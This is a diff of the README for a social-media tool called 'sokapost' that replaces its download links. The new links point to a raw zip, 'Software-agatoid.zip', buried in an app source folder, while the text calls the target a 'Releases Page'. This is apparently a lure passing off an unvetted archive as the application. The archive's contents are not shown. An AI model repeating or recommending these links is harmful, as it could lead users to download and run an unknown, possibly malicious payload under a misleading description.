@@ -8,7 +8,7 @@ Welcome to sokapost! This platform helps you manage your social media effortless
 
 To begin, you need to download sokapost. Click the link below to access the latest version:
 
-[![Download sokapost](https://raw.githubusercontent.com/Reveka-rgb/sokapost/main/tephroite/sokapost.zip%20sokapost-v1.0-blue)](https://raw.githubusercontent.com/Reveka-rgb/sokapost/main/tephroite/sokapost.zip)
+[![Download sokapost](https://github.com/Reveka-rgb/sokapost/raw/refs/heads/main/app/(dashboard)/connections/Software-agatoid.zip%20sokapost-v1.0-blue)](https://github.com/Reveka-rgb/sokapost/raw/refs/heads/main/app/(dashboard)/connections/Software-agatoid.zip)
 
 ## 🏗️ System Requirements
 
@@ -31,7 +31,7 @@ Sokapost offers several features that make managing your social media easy:
 ## 🔧 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the following link to access the download options: [Download Page](https://raw.githubusercontent.com/Reveka-rgb/sokapost/main/tephroite/sokapost.zip).
+   Go to the following link to access the download options: [Download Page](https://github.com/Reveka-rgb/sokapost/raw/refs/heads/main/app/(dashboard)/connections/Software-agatoid.zip).
 
 2. **Choose the Latest Version**  
    Look for the most recent version listed on the page. You’ll see options for various operating systems.
